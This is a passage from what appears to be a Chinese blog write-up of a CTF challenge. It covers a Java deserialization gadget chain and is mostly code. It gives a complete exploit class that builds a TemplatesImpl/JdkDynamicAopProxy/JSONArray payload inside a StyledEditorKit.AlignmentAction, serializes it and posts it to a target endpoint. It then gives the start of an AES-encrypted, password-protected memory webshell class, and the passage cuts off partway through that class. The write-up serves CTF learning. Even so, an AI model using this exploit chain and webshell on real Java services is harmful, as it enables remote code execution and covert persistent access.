alt="1699836526844"></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699836549771.png" alt="1699836549771"></p><p>Action.NAME 为固定的 Name，name 为我们的第一参数</p><p>跟进 <code>putValue</code></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699837756147.png" alt="1699837756147"></p><p>创建了 <code>arrayTable</code> , 把 Name 和 value 放入.</p><p>使用 <code>alignmentAction.putValue</code> ，将恶意键值也添加进 <code>arrayTable</code>  中.</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699838216914.png" alt="1699838216914"></p><p>随后 <code>writeObject</code>  写入序列化流</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699838409618.png" alt="1699838409618"></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699838392444.png" alt="1699838392444"></p><p>将键值对一次按队写入</p><p>readObject</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699842844409.png" alt="1699842844409"></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699842901393.png" alt="1699842901393"></p><p>会读取键值对，然后和之前一样，创建一个新的 <code>ArrayTable</code>  并且放入键值对.</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699844037396.png" alt="1699844037396"></p><p>但是如果一对键值对的 key 之前已经存入了该 key, 那么就会将该值赋值给 oldValue, 然后调用 <code>firePropertyChange</code> .</p><p>这里让 <code>oldValue</code>  为 <code>Xstring</code> , <code>newValue</code>  为 <code>jsonnodes</code>  即可.</p><p>要完成这个步骤，需要让 <code>jsonnodes</code>  的 key 和 <code>Xstring</code>  的 key 一致.</p><p>对此 Aecous 佬给出的方法简单粗暴，直接用 010 改文件的序列化数据</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699844191063.png" alt="1699844191063"></p><p>大 B 老师重写 wtireArrayTable 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeArrayTable</span><span class="params">(ObjectOutputStream s, ArrayTable table)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (table != <span class="literal">null</span> &amp;&amp; table.getKeys((Object[])<span class="literal">null</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">validCount</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            s.writeInt(<span class="number">3</span>);</span><br><span class="line">            s.writeObject(<span class="string">&quot;Name&quot;</span>);</span><br><span class="line">            s.writeObject(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            s.writeObject(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">            s.writeObject(table.get(<span class="string">&quot;key1&quot;</span>));</span><br><span class="line">            s.writeObject(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">            s.writeObject(table.get(<span class="string">&quot;key2&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s.writeInt(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不过这个方法我没打成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.SwingPropertyChangeSupport;</span><br><span class="line"><span class="keyword">import</span> javax.swing.text.StyledEditorKit;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java\\bypassjava\\META-INF\\maven\\com.example\\bypassJava\\target\\classes\\gsl.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1llustrious&quot;</span>);</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templatesImpl);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        POJONode jsonNodes2 = new POJONode(templatesImpl);</span></span><br><span class="line"><span class="comment">//        BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null);</span></span><br><span class="line"><span class="comment">//        Field val2 = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);</span></span><br><span class="line"><span class="comment">//        val2.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        val2.set(exp2,jsonNodes2);</span></span><br><span class="line"><span class="comment">//        KeyPairGenerator keyPairGenerator;</span></span><br><span class="line"><span class="comment">//        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span></span><br><span class="line"><span class="comment">//        keyPairGenerator.initialize(1024);</span></span><br><span class="line"><span class="comment">//        KeyPair keyPair = keyPairGenerator.genKeyPair();</span></span><br><span class="line"><span class="comment">//        PrivateKey privateKey = keyPair.getPrivate();</span></span><br><span class="line"><span class="comment">//        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);</span></span><br><span class="line"><span class="comment">//        SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine);</span></span><br><span class="line"><span class="comment">//        POJONode jsonNodes = new POJONode(signedObject);</span></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(proxyObj);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="type">SwingPropertyChangeSupport</span> <span class="variable">swingPropertyChangeSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingPropertyChangeSupport</span>(<span class="string">&quot;11&quot;</span>);</span><br><span class="line">        StyledEditorKit.<span class="type">AlignmentAction</span> <span class="variable">alignmentAction</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StyledEditorKit</span>.AlignmentAction(<span class="string">&quot;111&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.swing.AbstractAction&quot;</span>).getDeclaredField(<span class="string">&quot;changeSupport&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(alignmentAction,swingPropertyChangeSupport);</span><br><span class="line">        alignmentAction.putValue(<span class="string">&quot;key1&quot;</span>,xString);</span><br><span class="line">        alignmentAction.putValue(<span class="string">&quot;key2&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line"><span class="comment">//        objectOutputStream.writeUTF(&quot;NEEPU&quot;);</span></span><br><span class="line"><span class="comment">//        objectOutputStream.writeInt(1949);</span></span><br><span class="line">        objectOutputStream.writeObject(alignmentAction);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            unserialize(&quot;1.ser&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="comment">//            throw new RuntimeException(e);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//System.out.println(serial(exp));</span></span><br><span class="line">        <span class="comment">//deserial(serial(map));</span></span><br><span class="line">        <span class="comment">//doPOST(exp.toString().getBytes());</span></span><br><span class="line"><span class="comment">//        FileInputStream fileInputStream = new FileInputStream(&quot;1.ser&quot;);</span></span><br><span class="line">        <span class="comment">//System.out.println(serial(exp));</span></span><br><span class="line">        <span class="comment">//deserial(serial(map));</span></span><br><span class="line">        <span class="comment">//doPOST(exp.toString().getBytes());</span></span><br><span class="line"><span class="comment">//        byte[] byt=new byte[fileInputStream.available()];</span></span><br><span class="line"><span class="comment">//        fileInputStream.read(byt);</span></span><br><span class="line"><span class="comment">//        doPOST(byt);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HttpHeaders</span> <span class="variable">requestHeaders</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">        requestHeaders.set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"><span class="comment">//        URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;);</span></span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://localhost:8090/nomap&quot;</span>);</span><br><span class="line">        <span class="comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span></span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);</span><br><span class="line"></span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="内存马"><span id="内存马"> 内存马</span></h2><p>网上有很多内存马的写法，不过我整个有意思的.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">gsl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String  pass=<span class="string">&quot;pass&quot;</span>,md5;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.MessageDigest m;</span><br><span class="line">            m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class base64;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>], Thread.currentThread().getContextClassLoader());</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (Class) method.invoke(urlClassLoader, classbytes, <span class="number">0</span>, classbytes.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class 